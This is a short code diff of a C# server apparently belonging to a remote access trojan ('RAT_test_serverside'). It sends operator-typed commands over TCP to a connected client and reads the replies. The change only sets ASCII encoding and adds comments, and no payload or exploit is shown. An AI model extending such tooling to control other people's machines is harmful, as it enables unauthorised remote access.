@@ -26,8 +26,8 @@ namespace RAT_test_serverside
                 client = listener.AcceptTcpClient();
 
                 //Create the streams
-                StreamReader sr = new StreamReader(client.GetStream());
-                StreamWriter sw = new StreamWriter(client.GetStream());
+                StreamReader sr = new StreamReader(client.GetStream(),Encoding.ASCII);
+                StreamWriter sw = new StreamWriter(client.GetStream(),Encoding.ASCII);
 
                 try
                 {
@@ -43,6 +43,7 @@ namespace RAT_test_serverside
                     Console.WriteLine("Enter Command:");
                     cmd = Console.ReadLine();
 
+                    //Send data
                     try
                     {
                         Console.WriteLine("Sending: " + cmd);
@@ -51,6 +52,7 @@ namespace RAT_test_serverside
                     }
                     catch (Exception e) { }
 
+                    //Get data
                     try
                     {
                         Console.WriteLine();
